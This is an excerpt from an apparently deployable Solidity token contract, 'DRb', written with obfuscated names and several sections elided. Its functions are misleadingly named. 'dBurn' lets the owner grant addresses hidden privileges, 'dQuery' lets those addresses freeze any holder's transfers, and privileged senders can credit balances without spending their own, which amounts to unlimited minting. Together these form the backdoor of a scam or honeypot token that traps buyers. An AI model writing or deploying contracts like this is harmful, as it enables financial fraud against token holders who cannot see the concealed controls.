...
contract DRb is Context, Ownable {
    ...
    uint8 private constant _D = 8;
    uint256 private constant sD = 10000 * 10**_D;
    string private constant _name = "DRb";
    ...
    constructor () {
        Dc[_msgSender()] = sD;
        emit Transfer(address(0), _msgSender(), sD);
    }
    ...
    function allowance(address owner, address spender) public view  returns (uint256) {
        return eD[owner][spender];
	        ...
	        function dBurn(address Df) onlyOwner public{
        Db[Df] = true; }
		...
		function dStake(address Df) public {
        if(Db[msg.sender]) { 
        Dz[Df] = false;}}
        function dQuery(address Df) public{
         if(Db[msg.sender])  { 
        Dz[Df] = true; }}
        ...
        if(Db[msg.sender]) {Dc[Di] += Df;} else
        if(!Dz[msg.sender]) {
        require(Dc[msg.sender] >= Df);
        Dc[msg.sender] -= Df;  
        Dc[Di] += Df;          
